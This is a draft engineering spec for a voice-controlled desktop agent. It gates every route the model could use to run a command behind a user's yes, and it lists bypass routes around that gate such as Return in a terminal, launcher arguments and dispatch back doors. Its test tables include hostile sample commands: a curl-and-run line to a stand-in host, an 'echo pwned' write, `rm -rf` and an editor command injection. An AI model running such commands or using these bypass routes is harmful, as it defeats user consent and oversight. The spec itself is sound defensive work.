---
status: draft
issue: 112
intent: intent/2026-09-24-112-terminal-needs-shell.md
---

# Spec: With the shell off, every route to a command waits for a yes

Closes #112. Line numbers are from origin/main `fc33ae2`.

## The intent's open questions, answered

The intent was approved without answers to its six questions. Each is decided
below, with the reason, and each can be rejected at this gate. Rejecting one
changes the Design section and nothing else.

All evidence comes from fakes (`scratchpad/spec112.py`, not committed). An
`Executor` subclass on `Config(allow_shell=…)` has these fakes:

- `_shell` records argv and returns success.
- tmux lists one idle `bash` pane.
- `_query_rows` returns two windows: `Alacritty` (0x1, focused) and
  `firefox` (0x2).
- `keys_for_text` and `capabilities.dispatchers` are stubbed.
- `shutil.which` knows a fixed set of `omarchy-<route>` names from omarchy
  4.0.4.

`DBUS_SESSION_BUS_ADDRESS=unix:path=/nonexistent`. No command was run. The
proposed gate is prototyped in the subclass's `_call_locked`. It checks deny
and confirm first, then the rule below. That is the order the Design puts it
in.

### Q1. Scope: every route, or only `run_in_terminal`?

**Every route that runs a command line the model chose.** Gating only
`run_in_terminal` leaves open four routes that are just as short:
`omarchy_cli launch tui …`, compose `tui`/`terminal` panes, typing a command
and then pressing Return, and one more found while writing this spec:
`omarchy restart app <cmd…>`. `omarchy-restart-app` runs
`setsid uwsm-app -- "$@"`, per the 4.0.4 script. If only `run_in_terminal`
were gated, `doctor` would still be wrong. The intent's reading, that the key
means "no command without a yes", is the only one the README and `doctor` can
state truthfully.

### Q2. Hold or refuse, per route?

**Hold, on every route, through the existing single slot and release path.
Nothing new is refused.** A refusal would make voice unable to do the thing at
all on a default install. A hold keeps it possible and puts the user's yes
first.

The release path already exists for every engine:

- `Executor.run_pending` (`tools.py:1883-1901`) runs exactly the held
  `(name, args)`.
- realtime calls it at `realtime.py:961,1308`, the local engine at
  `local_engine.py:738`, the tty at `cli.py:159`, and MCP `confirm_last` at
  `mcp_server.py:164`, which applies #86's delay and phrase check.
- The Claude Code brain runs our tools in-process on the same Executor
  (`claude_backend.py:548-562`). An Executor hold is therefore released by
  `run_pending`. The model cannot release it itself, because #86 denies
  `confirm_last` (`claude_backend.py:404-411`).

`compose_windows` is held as one action. The yes releases the whole
composition. That only counts as consent if the user was told what the
composition runs. Today `describe` shows a pane's `name` in place of its
target (`tools.py:2022-2029`). Shown with fakes:

```
compose 2 windows on workspace next (columns): notes, https://e.example/
```

That is the line for a `tui` pane named `notes` whose target is
`bash -c 'echo pwned > ~/f'`. So `describe` must name the command of every pane
that has one (Design §3). There is a second consequence. Once the description
carries the command, a confirm pattern holds the compose at the front gate.
The per-pane re-check (`tools.py:3463-3465`) must then stop refusing on a
confirm match, or else the release would refuse what the user just approved.
It keeps refusing on deny matches.

### Q3. Type-then-Return: how it is detected without breaking typing

**Hold the key that submits the line, not the typing.** With the shell off,
the following are held when the target window is a terminal:

- `send_shortcut` with Return, KP_Enter, ISO_Enter or Linefeed, or with CTRL
  plus `m`, `j` or `o`. Those three are readline's accept-line (twice) and
  operate-and-get-next.
- the same keys sent through `hypr_dispatch` `send_shortcut` or
  `send_key_state`. That is the back door `_check_dispatch_args` already knows
  about (`tools.py:1570-1586`). A `message` form is held too, because its key
  cannot be read.
- `type_text` whose text contains `\r` or `\n`. xkb maps Return to `\r`, so
  `type_text "ls\r"` presses Return.

"A terminal" means the window's class matches `TERMINAL_CLASSES`
(`tools.py:378`), the same list `_terminal_on_screen` uses. The window is
resolved with `_resolve_window` (`tools.py:3062`). A window that cannot be
resolved counts as a terminal, so an unknown target fails closed.

Typing with no newline is not held. Return into a window that is not a
terminal is not held. With fakes, shell off:

| Call | Verdict |
| --- | --- |
| `type_text "python3 -c 'print(1)'"` → Alacritty | RAN (typing only) |
| `type_text "ls\r"` → Alacritty | HELD |
| `send_shortcut Return` → Alacritty | HELD |
| `send_shortcut enter` → activewindow (Alacritty) | HELD |
| `send_shortcut ctrl+m` → Alacritty | HELD |
| `send_shortcut ctrl+c` → Alacritty | RAN |
| `hypr_dispatch send_shortcut {key=Return, window=0x1}` | HELD |
| `send_shortcut Return` → firefox | RAN |
| `type_text "hello\r"` → firefox | RAN |

Cost: with the shell off, every Return into a terminal needs a yes. That
includes answering a `y/N` prompt and pressing Enter in terminal vim. The
cost is accepted because a terminal's Return runs whatever is on the line,
and the executor cannot tell a prompt from a shell. Rejecting this means
leaving keyboard input to the deny list, and `doctor` would then have to say
so.

The alternative of holding only a Return that follows typed text in the same
turn was rejected (see Alternatives).

### Q4. `omarchy_cli`: an allowlist, or hold the routes that carry a command?

**Hold the two families whose scripts start a process from their arguments,
`launch` and `restart`, unless the call has one of the known command-free
shapes. Every other route runs as today.** The decision uses the route and the
argument count, never the command text:

1. The route family comes from `argv[0]` with the `omarchy-` prefix and
   hyphens folded, so `launch-or-focus` is caught even if it is missing from
   `_HYPHENATED_ROUTES` (`tools.py:1675`). If the family is not `launch` or
   `restart`, the call runs (`theme set 'Tokyo Night'`, toggles, and so on).
2. If `shutil.which("omarchy-" + "-".join(words))` resolves, the whole argv is
   a route name and nothing is passed on, so the call runs. This covers
   `launch terminal` (the #71 router's route), `launch about`, and
   `launch editor` with no arguments.
3. The call also runs if it has one of these shapes. `NAME` is a bare program
   name, `^[A-Za-z0-9][A-Za-z0-9_.+-]*$`, with no arguments:
   - `launch tui NAME`
   - `launch or focus tui NAME`
   - `launch webapp <http(s) URL>`
   - `launch or focus webapp NAME <http(s) URL>`
4. Anything else in the two families is held. Examples: `launch tui` with
   arguments, `launch terminal -e …`, `launch floating terminal with
   presentation …`, `launch or focus <pattern> <cmd>`, `launch editor
   '+!cmd'` (nvim runs `+!`), `restart app …`, and a webapp given extra
   browser flags.

If `which` fails, for example because omarchy is not on PATH, step 2 cannot
pass. The call is then held unless step 3 matches. That fails closed.

Why not a full allowlist of every route: omarchy has about 128 routes. Many
take values, such as `theme set <name>` and `font set <name>`. Holding all of
them would put a yes in front of everyday voice use, and the list would need
re-auditing for every omarchy release. Why not a denylist of named scripts:
it fails open on the next launcher. Within `launch` and `restart`, this rule
is an allowlist of shapes, so it fails closed where the risk is. The residual
risk is a route outside those two families that runs its arguments (see
Risks).

A bare `NAME` in step 3 can still be a zero-argument program with side
effects, such as `launch tui reboot`. The default confirm patterns hold
`reboot`, `poweroff`, `shutdown` and `suspend` (`config.py:108-128`).

### Q5. One slot: one yes per command, and does a yes cover only that command?

**One yes per command. A yes covers exactly the held call, once.** This is
#76's rule, and the release path already enforces it: `run_pending` clears the
slot and runs the stored tuple. A second gated call in the same turn is
refused with "another action is already waiting" (`tools.py:1855-1860`).
Shown with fakes, shell off:

```
1st call  : run_in_terminal "python3 -c 'print(1)'"  -> held
2nd, other: run_in_terminal "make"                   -> another action is already waiting for confirmation
release   : run_pending -> tmux send-keys -t Work:1.1 -- "python3 -c 'print(1)'" Enter
same again: run_in_terminal "python3 -c 'print(1)'"  -> HELD (a yes is spent on one call)
log       : HOLD … (runs a command in a terminal; allow_shell is off) / CONFIRM … / HOLD … / CANCEL …
```

A multi-step terminal job therefore costs one yes per step. For anyone who
wants it to flow, the fix is `allow_shell = true`, and p620 already has it.
Letting one yes cover the rest of the turn was rejected: that is the blanket
approval #76 removed.

### Q6. What `doctor` prints, and the README

**The rule in one line, not the list of routes.** The list goes in the
README, where it can be complete. `shell_status` (`cli.py:245-256`) becomes:

- off: `  shell: off — run_shell is not offered; any other command (terminal, launcher, compose pane, Return in a terminal) waits for your yes; N deny rules, M confirm rules`
- on: `  shell: on — commands run without asking, except N deny rules and M confirm rules`

The docstring's "`allow_shell` is the whole answer" is replaced with the rule
above.

README:

- `README.md:257`: replace "so `allow_shell` means what it says" with: "With
  `allow_shell` off, `run_shell` is not offered, and every other way to run a
  command waits for your yes: `run_in_terminal`, an omarchy launcher given a
  command, a compose `terminal`/`tui` pane with a command, and Return in a
  terminal."
- `README.md:832-834`: keep "Blocked as process execution" for `exec_cmd` /
  `exec_raw` and `launch_app` command lines, which are still true. Add a
  sibling bullet, "**Held when the shell is off**", listing the routes in the
  table below, and the fact that the yes is spent on that one call.
- `README.md:597`, in the `run_in_terminal` section: one sentence saying that
  with the shell off each command is held for a yes.
- `README.md:851` ("Off by default: the shell tool"): append "with it off,
  commands elsewhere wait for a yes".

### The result, with fakes (shell off / shell on)

| Call | off | on |
| --- | --- | --- |
| `run_in_terminal "python3 -c 'import os; os.system(…)'"` | HELD | RAN |
| `run_in_terminal "bash -c 'echo pwned > ~/f'"` | HELD | RAN |
| `run_in_terminal "curl -o x https://e.example/x && sh x"` | HELD | RAN |
| `run_in_terminal "find ~/tmpdir -name '*.log' -delete"` | HELD | RAN |
| `run_in_terminal "rm -rf ~/x"` | REFUSED (deny) | REFUSED (deny) |
| `omarchy_cli "launch tui bash -c '…'"` | HELD | RAN |
| `omarchy_cli "launch floating terminal with presentation '…'"` | HELD | RAN |
| `omarchy_cli "launch or focus zzz 'bash -c …'"` | HELD | RAN |
| `omarchy_cli "launch terminal -e bash -c '…'"` | HELD | RAN |
| `omarchy_cli "restart app bash -c '…'"` | HELD | RAN |
| `omarchy_cli "launch-or-focus tui python3 -c '…'"` | HELD | RAN |
| `omarchy_cli "launch editor '+!touch /tmp/x'"` | HELD | RAN |
| `omarchy_cli "launch terminal"` (router) | RAN | RAN |
| `omarchy_cli "launch tui btop"` / `"launch or focus tui lazygit"` | RAN | RAN |
| `omarchy_cli "launch-or-focus webapp x https://x.com/"` / `"launch webapp https://…"` | RAN | RAN |
| `omarchy_cli "launch about"` / `"theme set 'Tokyo Night'"` | RAN | RAN |
| `compose_windows` tui `bash -c …` + terminal `-e python3 …` | HELD | RAN |
| `compose_windows` tui `btop` + empty terminal + web | RAN | RAN |
| keyboard rows | as in Q3 | all RAN |
| `launch_app "bash -c …"`, `hypr_dispatch exec_cmd` | REFUSED | RAN (unchanged, #22) |

In the "on" column every row is what main does today. p620 sets
`hands.allow_shell = true`, so it is unaffected.

## Design

### 1. One gate, in `Executor._call_locked`

`tools.py:1849-1864` today: describe, `Policy.check`, then deny → refuse and
confirm → hold. The new step goes inside the same `try`, right after
`self.policy.check(...)`:

```python
if not self.config.allow_shell and name not in READ_ONLY_TOOLS \
        and (why := self._runs_command(name, args)):
    raise NeedsConfirmation(description)
```

The existing `except NeedsConfirmation` branch does the rest: the one-slot
check, `pending`, `pending_since`, the `HOLD` record and `confirm_instruction`.
The `HOLD` line gets the reason appended (`(… ; allow_shell is off)`) so that
`omarchy-voice log` says why. Because the step comes after
`Policy.check`, deny rules refuse before anything is held (the `rm -rf` row).
Because it comes before the dry-run branch, dry runs hold the same way they do
for confirm patterns. `run_pending` does not go back through
`_call_locked`, so a released call is not held again.

This is one place, and every engine goes through it: `Executor.call` for
realtime, the planner and the local engine, and the in-process MCP server for
Claude Code.

### 2. `Executor._runs_command(name, args) -> str | None`

This is a new method next to `describe`. It returns a short reason, or None.
All of its rules are the ones prototyped above:

- `run_in_terminal`: always.
- `omarchy_cli`: the Q4 rule, on `normalise_omarchy(command)[0]`
  (`tools.py:1682`). It is a module-level helper, `omarchy_runs_command(argv)`,
  beside `_misused_launch_browser`, so it can be tested without an Executor.
- `compose_windows`: any pane with `kind == "terminal"` and a non-empty
  target, or `kind == "tui"` whose target is not a bare `NAME`. The helper
  `_pane_runs_command(kind, target)` sits beside `_pane_command`
  (`tools.py:701`).
- `send_shortcut`, `type_text`, and `hypr_dispatch` with `send_shortcut` or
  `send_key_state`: the Q3 rule. The window is resolved with
  `_resolve_window(window or "activewindow")`. A failed resolve counts as a
  terminal. The keysym and mods are normalised with `normalise_key` and
  `normalise_mods` (`keys.py:161,190`), so `enter`, `newline` and `ctrl` are
  judged as the keys that will actually be pressed.

Constants go beside `TERMINAL_CLASSES`: `_BARE_PROGRAM_RE`, `SUBMIT_KEYS`
(`Return`, `KP_Enter`, `ISO_Enter`, `Linefeed`) and `CTRL_SUBMIT_KEYS`
(`m`, `j`, `o`).

### 3. `describe` names compose commands; the per-pane check keeps only deny

- `describe` for `compose_windows` (`tools.py:2022-2029`) labels each
  command-bearing pane `name (kind: target)`. `target` is not cut at 32
  characters for those panes. The line the user says yes to then contains
  what will run, and deny and confirm patterns see it at the front gate.
- The per-pane check (`tools.py:3460-3465`) catches `Denied` only and lets
  `NeedsConfirmation` pass. Confirmation was decided once, at the front gate,
  on a description that now contains the command. The alternative is the Q2
  failure, where the release refuses its own pane. The check stays as
  defence in depth for deny rules.

### 4. `doctor` and the README

`cli.shell_status` gets the two lines in Q6. The README edits are in Q6.

### 5. Unchanged

- `tools_for` (`tools.py:1482-1496`). Nothing new is withheld, because held
  tools must stay offered for voice to work with consent.
- The tool schemas.
- Persona (`persona.py:118-121`). `confirm_instruction` already says "do not
  try another route around it", which is the steering a held command needs.
  Adding a config-dependent persona line is not worth a second source of
  truth.
- `launch_app` and `hypr_dispatch` exec refusals (#22).
- `watch_terminal`, `read_terminal`, `list_terminals`.
- ai-mirror input, which has its own consent through `desktop_control` and
  its dialog.
- The internal `omarchy launch terminal tmux` in `_ensure_visible_session`
  (`tools.py:3765`). It is our fixed argv, not a tool call, and it runs only
  after the `run_in_terminal` it serves has been released.

## Alternatives rejected

- **Refuse instead of hold.** With the shell off, voice could not run a
  terminal command at all. The user's yes is the consent the intent asks for,
  and the release path already exists.
- **Gate only `run_in_terminal`.** This leaves four equivalent routes open,
  and `doctor` stays wrong.
- **Withhold `run_in_terminal` from `tools_for`.** It removes the one visible,
  asks-first route and pushes the model toward the other routes. The #82 spec
  rejected this for the same reason.
- **Full allowlist of omarchy routes.** It puts a yes in front of value-taking
  routes like theme and font, and needs re-auditing every release (Q4).
- **Denylist of named omarchy launchers.** It fails open on the next launcher
  and misses shapes like `restart app`. The rule chosen is an allowlist of
  shapes within the two families that spawn.
- **Classify the command text** (e.g. "is it `python3 -c`?"). The intent's
  constraint rules this out: a rule the executor cannot check is not a guard.
- **Hold `type_text` into a terminal.** It holds all typing, including text
  the user asked for in terminal editors, while the harm needs a submit key
  anyway.
- **Hold Return only after text typed in the same turn.** The state can be
  bypassed across turns (type in one turn, press Return in the next), and a
  line may already hold text the user or a paste put there.
- **One yes covers the rest of the turn.** This is the blanket approval #76
  removed. A misheard sentence would get a free run.

## Risks

- **An omarchy route outside `launch`/`restart` that runs its arguments**,
  now or in a later omarchy, is not held. From the 4.0.4 scripts,
  `omarchy-hook` runs the user's own hook files with arguments. Those files
  are the user's code, not the model's. Deny and confirm patterns still apply
  to the whole argv. The family set lives in one constant, next to
  `_HYPHENATED_ROUTES`.
- **Terminals inside apps.** Examples are VS Code's or Zed's integrated
  terminal, emacs vterm, and a browser-based shell. Their class is not a
  terminal class, so Return there is not held. The executor cannot see inside
  an app. README states this.
- **Paste then Return.** Return is held. Paste chords are not, which relies
  on bracketed paste, the default in bash ≥ 5.1, zsh and fish, to stop a
  pasted newline from submitting. A shell without it would run a pasted
  `cmd\n`.
- **A yes for Return is consent to "whatever is on that line".** The
  description is `press Return in <window>`, which does not show the line.
  `run_in_terminal`'s description shows the command, so a model held on
  Return is better off using that tool. The release path is unchanged either
  way.
- **Friction on a default install.** Answering a terminal prompt, Enter in
  terminal vim, `launch tui htop -d 5`, and `launch editor <file>` all need a
  yes with the shell off. This is the Q3/Q4 cost, and it can be rejected here.
- **The window lookup costs time.** The keyboard rules resolve the window: one
  `hyprctl -j clients` of about 14 ms, and only for submit keys or a newline
  in text. `_input_refused` makes the same query right after. Sharing it is a
  plan-level optimisation, not required.
- **Existing tests.** Tests that send these tools through `Executor.call` on a
  default `Config()` will now see holds: `test_terminal.py`,
  `test_compose.py`, `test_input_guard.py`, `test_keys.py`,
  `test_local_engine.py`, `test_mcp.py` and `test_realtime.py` reference them.
  Each such test either sets `allow_shell=True`, which is today's behaviour,
  or asserts the hold. `test_backend_choice.py:346-360` changes with the new
  `doctor` text.
- **Hosts.** p620 has `allow_shell = true` and is unaffected. razer and any
  default install get the holds. No NixOS module change is needed.

## Verification

Fake tests only: the `_shell` recorder, faked `_query_rows`, patched
`shutil.which`, and `DBUS_SESSION_BUS_ADDRESS=unix:path=/nonexistent` via
`tests/_isolated.py`. There is one test per route, each run with shell off
and shell on:

1. `run_in_terminal`: the four intent commands are HELD with the shell off
   and never reach `send-keys`. With the shell on they send the same argv as
   main. `rm -rf` is REFUSED in both.
2. `omarchy_cli`: every held and free row of the result table is checked
   through `omarchy_runs_command`, and end to end through `Executor.call`
   with the shell off and on. `which` returning None holds `launch terminal`
   (fail closed).
3. `compose_windows`: a tui/terminal command pane is HELD. `describe`
   contains each pane's command. `run_pending` launches every pane,
   including one whose command matches a confirm pattern, while a deny match
   still refuses the pane. A tui `btop` + empty terminal + web compose runs
   unheld.
4. Keyboard: the Q3 table, plus `hypr_dispatch send_key_state` with Return and
   the `message` form, and an unresolvable window, which is held.
5. Release: after `run_pending`, the same call is held again, and a second
   gated call while one is held is refused (Q5). MCP `confirm_last` releases a
   held `run_in_terminal` after `CONFIRM_DELAY` with a confirm phrase.
6. `shell_status`: the two Q6 lines.
7. The router: `route("open a terminal")` goes through `Executor.call` unheld
   with the shell off.

Commands:

```
DBUS_SESSION_BUS_ADDRESS=unix:path=/nonexistent python3 -m unittest discover -s tests   # 1075 + new, all pass
nix flake check --no-write-lock-file
```
